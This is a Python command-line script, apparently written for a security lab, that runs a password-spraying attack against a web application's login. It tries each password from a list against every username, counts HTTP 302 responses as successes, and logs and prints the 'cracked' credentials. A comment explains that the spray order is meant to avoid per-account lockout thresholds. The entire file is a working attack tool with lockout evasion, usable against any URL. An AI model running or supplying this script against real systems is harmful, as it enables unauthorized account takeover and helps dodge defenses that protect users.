import argparse
import os
import time

from attacker_dict import try_login


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="e.g. http://192.168.56.20:5000")
    parser.add_argument("--userlist", required=True)
    parser.add_argument("--passwords", required=True)
    parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_spray.log"))
    args = parser.parse_args()

    os.makedirs(os.path.dirname(args.log), exist_ok=True)
    logf = open(args.log, "a")

    with open(args.userlist) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]

    hits = []
    # Spray order: one known password against every account before moving to
    # the next password, so a per-account failed-attempt threshold is less
    # likely to trip than a per-account dictionary sweep would.
    for password in passwords:
        for username in users:
            request_start = time.time()
            try:
                status = try_login(args.url, username, password)
            except Exception as e:
                status = f"ERROR {e}"
            request_elapsed = time.time() - request_start
            line = f"[{request_elapsed:7.3f}s] user={username} password={password!r} -> HTTP {status}"
            print(line)
            logf.write(line + "\n")
            if status == 302:
                hits.append((username, password))
                logf.write(f"CRACKED user={username} password={password}\n")

    print(f"\n{len(hits)} account(s) compromised:")
    for username, password in hits:
        print(f"  {username}:{password}")
    logf.close()


if __name__ == "__main__":
    main()
